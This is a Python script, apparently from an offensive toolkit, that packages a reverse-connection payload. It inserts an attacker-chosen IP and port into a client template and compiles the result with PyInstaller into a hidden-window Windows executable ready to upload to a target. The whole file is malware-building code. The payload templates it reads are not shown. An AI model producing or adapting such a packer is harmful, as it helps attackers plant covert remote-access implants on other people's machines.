# -*- coding:utf-8 -*-
# @payload  :payload packer.py
# @Time      :2022/11/22 19:25:40
# @Author    :D0WE1L1N
from os import system, remove, getcwd, mkdir, rename
from os.path import isfile, basename, isdir
from shutil import move, rmtree
def pack(payload, ip, port, printf):
	command = "pyinstaller -F payload/payload.py -w"
	if printf:
		print("payload>[*]Loading payload......")
		with open("./payload/" + payload + "_file.py", "r", encoding="utf8") as p:
			pay = p.read()
		with open("./payload/payload.py", "w+", encoding="utf8") as a:
				a.write(pay)
				a.write(f"""
if __name__ == '__main__':
	PINGPONG_client("{ip}", {port})""")
	else:
		with open("./payload/_basic_conn.py", "r", encoding="utf8") as p:
			pay = p.read()
		with open("./payload/payload.py", "w+", encoding="utf8") as a:
				a.write(pay)
				a.write(f"""
if __name__ == '__main__':
	_connent("{ip}", {port})""")
	try:
		system(command)
		if printf:
			print("payload>[*]deleting temp files......")
		remove("./payload/payload.py")
		if isfile("payload.exe"):
			remove("payload.exe")
		if isdir("./payload/upload_payload"):
			rmtree("./payload/upload_payload")
		try:
			mkdir("./payload/upload_payload")
		except:
			pass
		if not printf:
			move("dist/payload.exe", "./payload/upload_payload")
			rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/upload_payload.exe")
		else:
			move("dist/payload.exe", "./payload/upload_payload")
			rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/PINGPONG_payload.exe")
		remove("payload.spec")
		rmtree("build")
		rmtree("dist")
		if printf:
			print("payload>[+]Done Successfully")
	except(ImportError):
		print("payload>[*]You might not install pyinstaller, installing it now......")
		system("pip install pyinstaller")
		if printf:
			print("payload>[*]re-packing")
		system(command)
	except(FileNotFoundError):
		if printf:
			print("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
			print("The payload file may be in the dir: ./dict")
